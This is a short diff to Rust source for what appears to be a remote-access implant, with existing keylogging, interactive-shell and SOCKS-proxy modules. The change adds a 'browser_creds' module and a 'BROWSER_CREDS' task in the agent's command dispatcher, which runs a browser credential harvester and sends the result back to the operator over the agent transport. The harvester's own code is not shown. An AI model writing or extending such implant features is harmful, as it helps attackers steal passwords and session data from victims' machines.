@@ -20,6 +20,8 @@ mod commands_ishell;
 mod keylog;
 #[path = "socks.rs"]
 mod socks;
+#[path = "browser_creds.rs"]
+mod browser_creds;
 
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
@@ -878,6 +880,10 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "SOCKS_STOP" => {
             socks::socks_stop();
             t.send_result(task.id, "[+] SOCKS5 proxy stopped", "");
+        }
+        "BROWSER_CREDS" => {
+            let result = browser_creds::do_browser_creds();
+            t.send_result(task.id, &result, "");
         }
         _ => {
             // Delegate to feature modules
